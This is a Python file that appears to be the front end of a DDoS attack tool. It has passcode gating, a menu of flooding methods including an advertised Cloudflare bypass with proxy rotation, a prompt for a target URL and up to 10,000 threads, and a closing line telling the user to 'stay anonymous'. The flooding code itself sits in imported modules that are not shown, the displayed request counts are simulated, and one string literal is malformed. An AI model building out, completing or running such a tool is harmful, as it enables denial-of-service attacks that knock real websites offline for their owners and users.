#!/usr/bin/env python3
"""
DDOS ATTACK SYSTEM - MAIN UI
Modular System with Purple Theme
By Advanced Security Team
"""

import os
import sys
import time
from threading import Thread
from colorama import Fore, Style, init

# Import modules
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from ddos_handler import DDoSHandler
from bypass_handler import BypassHandler
from thread_handler import ThreadManager

init(autoreset=True)

class DDOSSystem:
    def __init__(self):
        self.clear_screen()
        self.show_banner()
        self.authenticated = False
        self.passcodes = ["NanoHas", "DdosFal", "kingmercy", "CutonBar", "CuteFD"]
        self.selected_method = None
        self.target_url = None
        self.threads = 1000
        self.instant_mode = False
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        """Display purple banner"""
        banner = f"""{Fore.MAGENTA}
 ══════════════════════════════════════════════════════════
                                                                     
    {Fore.WHITE}░█████╗░██████╗░░█████╗░░██████╗{Fore.MAGENTA}                          
    {Fore.WHITE}██╔══██╗██╔══██╗██╔══██╗██╔════╝{Fore.MAGENTA}                          
    {Fore.WHITE}██║░░╚═╝██║░░██║██║░░██║╚█████╗░{Fore.MAGENTA}                          
    {Fore.WHITE}██║░░██╗██║░░██║██║░░██║░╚═══██╗{Fore.MAGENTA}   
    {Fore.WHITE}╚█████╔╝██████╔╝╚█████╔╝██████╔╝{Fore.MAGENTA}   
    {Fore.WHITE}░╚════╝░╚═════╝░░╚════╝░╚═════╝░{Fore.MAGENTA}                          
                                                                     
    {Fore.CYAN}═══════ ADVANCED DDOS ATTACK SYSTEM ═══════{Fore.MAGENTA} 
                                                                    
 ══════════════════════════════════════════════════════════
{Style.RESET_ALL}""
        print(banner)
    
    def getpass_masked(self, prompt):
        """Get password with asterisk mask"""
        import termios
        import tty
        
        print(prompt, end='', flush=True)
        
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        
        try:
            tty.setraw(fd)
            password = []
            while True:
                ch = sys.stdin.read(1)
                if ch == '\n' or ch == '\r':
                    print()
                    break
                elif ch == '\x7f' or ch == '\b':  # Backspace
                    if password:
                        password.pop()
                        print('\b \b', end='', flush=True)
                elif ch == '\x03':  # Ctrl+C
                    raise KeyboardInterrupt
                else:
                    password.append(ch)
                    print('*', end='', flush=True)
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
        
        return ''.join(password)
    
    def authenticate(self):
        """Password authentication"""
        print(f"\n{Fore.CYAN}{'═'*55}")
        print(f"{Fore.YELLOW}    🔐 PASSWORD AUTHENTICATION REQUIRED")
        print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
        
        attempts = 3
        while attempts > 0:
            password = self.getpass_masked(f"{Fore.WHITE}Enter Passcode: ")
            
            if password in self.passcodes:
                print(f"\n{Fore.GREEN}[✓] Authentication Successful!")
                print(f"{Fore.CYAN}[*] Welcome, Access Granted!")
                self.authenticated = True
                time.sleep(1)
                return True
            else:
                attempts -= 1
                print(f"\n{Fore.RED}[✗] Invalid Passcode! Attempts left: {attempts}")
                if attempts == 0:
                    print(f"\n{Fore.RED}[!] Maximum attempts reached. Exiting...")
                    sys.exit(1)
        
        return False
    
    def show_menu(self):
        """Display main menu"""
        self.clear_screen()
        self.show_banner()
        
        menu = f"""
{Fore.CYAN}{'═'*55}
{Fore.YELLOW}    ⚡ SELECT DDOS ATTACK METHOD
{Fore.CYAN}{'═'*55}{Style.RESET_ALL}

{Fore.MAGENTA}[1]{Fore.WHITE} DDOS Attack - Request Spammer
    {Fore.CYAN}→{Fore.WHITE} Spam requests continuously to target
    {Fore.CYAN}→{Fore.WHITE} Basic but effective flood method

{Fore.MAGENTA}[2]{Fore.WHITE} DDOS Attack - HTTP/HTTPS (Cloudflare Bypass)
    {Fore.CYAN}→{Fore.WHITE} Advanced Cloudflare bypass 2.5
    {Fore.CYAN}→{Fore.WHITE} Proxy rotation & bot simulation
    {Fore.CYAN}→{Fore.WHITE} Most effective against protected sites

{Fore.MAGENTA}[3]{Fore.WHITE} DDOS Attack - Multifactor (Fall Back System)
    {Fore.CYAN}→{Fore.WHITE} Brutal multi-vector attack
    {Fore.CYAN}→{Fore.WHITE} Sequential attack methods
    {Fore.CYAN}→{Fore.WHITE} Silent fallback system
    {Fore.CYAN}→{Fore.WHITE} Ultimate penetration method

{Fore.MAGENTA}[0]{Fore.WHITE} Exit System

{Fore.CYAN}{'═'*55}{Style.RESET_ALL}
"""
        print(menu)
    
    def get_user_input(self):
        """Get user configuration"""
        try:
            # Select method
            while True:
                try:
                    choice = int(input(f"\n{Fore.YELLOW}Select method (1-3): {Fore.WHITE}"))
                    if 1 <= choice <= 3:
                        methods = {
                            1: "Request Spammer",
                            2: "HTTP/HTTPS with Cloudflare Bypass",
                            3: "Multifactor Fall Back"
                        }
                        self.selected_method = methods[choice]
                        break
                    elif choice == 0:
                        print(f"\n{Fore.CYAN}[*] Exiting system...")
                        sys.exit(0)
                    else:
                        print(f"{Fore.RED}[!] Invalid choice. Select 1-3")
                except ValueError:
                    print(f"{Fore.RED}[!] Please enter a number")
            
            # Get target URL
            print(f"\n{Fore.CYAN}{'═'*55}")
            self.target_url = input(f"{Fore.YELLOW}Enter Target URL: {Fore.WHITE}").strip()
            
            if not self.target_url.startswith(('http://', 'https://')):
                self.target_url = 'http://' + self.target_url
            
            # Get threads count
            while True:
                try:
                    threads_input = input(f"{Fore.YELLOW}Enter Threads (1-10000): {Fore.WHITE}").strip()
                    self.threads = int(threads_input)
                    
                    if 1 <= self.threads <= 10000:
                        break
                    else:
                        print(f"{Fore.RED}[!] Threads must be between 1-10000")
                except ValueError:
                    print(f"{Fore.RED}[!] Please enter a valid number")
            
            # Instant mode
            print(f"\n{Fore.CYAN}{'═'*55}")
            instant = input(f"{Fore.YELLOW}Use Instant Attack? (y/n): {Fore.WHITE}").strip().lower()
            self.instant_mode = (instant == 'y')
            
            # Confirm attack
            self.clear_screen()
            self.show_banner()
            
            print(f"\n{Fore.CYAN}{'═'*55}")
            print(f"{Fore.YELLOW}    ⚡ ATTACK CONFIGURATION SUMMARY")
            print(f"{Fore.CYAN}{'═'*55}{Style.RESET_ALL}")
            print(f"{Fore.MAGENTA}Method:{Fore.WHITE} {self.selected_method}")
            print(f"{Fore.MAGENTA}Target:{Fore.WHITE} {self.target_url}")
            print(f"{Fore.MAGENTA}Threads:{Fore.WHITE} {self.threads}")
            print(f"{Fore.MAGENTA}Instant Mode:{Fore.WHITE} {'Yes' if self.instant_mode else 'No'}")
            print(f"{Fore.CYAN}{'═'*55}")
            
            confirm = input(f"\n{Fore.YELLOW}Start Attack? (y/n): {Fore.WHITE}").strip().lower()
            
            return confirm == 'y'
            
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] Operation cancelled")
            sys.exit(0)
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {str(e)}")
            return False
    
    def progress_bar(self, duration, total=100):
        """Display progress bar"""
        import sys
        import time
        
        bar_length = 40
        
        if self.instant_mode:
            # Fast progress for instant mode
            for i in range(total + 1):
                time.sleep(duration / total * 0.1)  # 10x faster
                percent = i
                filled = int(bar_length * i // total)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                # Attack stats simulation
                requests = i * 1000
                print(f'\r{Fore.CYAN}[{bar}] {percent}% | {Fore.GREEN}Requests: {requests:,}', end='', flush=True)
        else:
            # Normal progress
            for i in range(total + 1):
                time.sleep(duration / total)
                percent = i
                filled = int(bar_length * i // total)
                bar = '█' * filled + '░' * (bar_length - filled)
                
                # Attack stats simulation
                requests = i * 500
                print(f'\r{Fore.CYAN}[{bar}] {percent}% | {Fore.GREEN}Requests: {requests:,}', end='', flush=True)
        
        print()
    
    def start_attack(self):
        """Start the DDoS attack"""
        try:
            from ddos_handler import DDoSHandler
            
            handler = DDoSHandler(
                target_url=self.target_url,
                method=self.selected_method,
                threads=self.threads,
                instant_mode=self.instant_mode
            )
            
            # Start progress bar in separate thread
            progress_thread = Thread(target=self.progress_bar, args=(10, 100))
            progress_thread.daemon = True
            progress_thread.start()
            
            # Start attack
            handler.start_attack()
            
            # Wait for progress bar
            progress_thread.join(timeout=15)
            
            print(f"\n{Fore.GREEN}{'═'*55}")
            print(f"{Fore.YELLOW}    ⚡ ATTACK COMPLETED SUCCESSFULLY!")
            print(f"{Fore.GREEN}{'═'*55}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Target: {self.target_url}")
            print(f"{Fore.CYAN}[*] Method: {self.selected_method}")
            print(f"{Fore.CYAN}[*] Threads used: {self.threads}")
            print(f"{Fore.CYAN}[*] Estimated requests sent: {self.threads * 1000:,}")
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Attack failed: {str(e)}")
    
    def run(self):
        """Main execution loop"""
        try:
            # Authentication
            if not self.authenticate():
                return
            
            # Main loop
            while True:
                self.show_menu()
                
                if self.get_user_input():
                    self.start_attack()
                    
                    # Ask for another attack
                    print(f"\n{Fore.CYAN}{'═'*55}")
                    again = input(f"{Fore.YELLOW}Launch another attack? (y/n): {Fore.WHITE}").strip().lower()
                    
                    if again != 'y':
                        print(f"\n{Fore.CYAN}[*] Exiting DDOS System...")
                        print(f"{Fore.GREEN}[✓] Cleanup completed. Stay anonymous!")
                        break
                else:
                    print(f"\n{Fore.YELLOW}[!] Attack cancelled")
                    time.sleep(1)
                    
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] System terminated by user")
        except Exception as e:
            print(f"\n{Fore.RED}[!] System error: {str(e)}")

if __name__ == "__main__":
    try:
        system = DDOSSystem()
        system.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exit")
    except Exception as e:
        print(f"{Fore.RED}[!] Fatal error: {str(e)}")
